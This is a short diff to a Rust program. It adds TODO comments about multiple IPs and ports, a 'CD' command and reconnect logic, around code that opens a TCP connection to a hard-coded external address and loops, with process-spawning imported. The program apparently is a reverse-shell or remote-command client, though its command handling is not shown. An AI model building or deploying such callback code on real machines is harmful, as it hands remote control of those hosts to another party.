@@ -5,6 +5,12 @@ use std::process::Command;
 use local_ip_address::local_ip;
 use std::{thread, time};
 
+//TODO 
+//Implement multiple IP addresses and ports (eventually connect to the router)
+//Implement CD
+//Implement connect function that always tries to connect then returns a socket
+//Refactor
+
 fn main() {
     let mut stream = TcpStream::connect("129.21.49.57:5678").unwrap(); //connects via TCP
     loop {
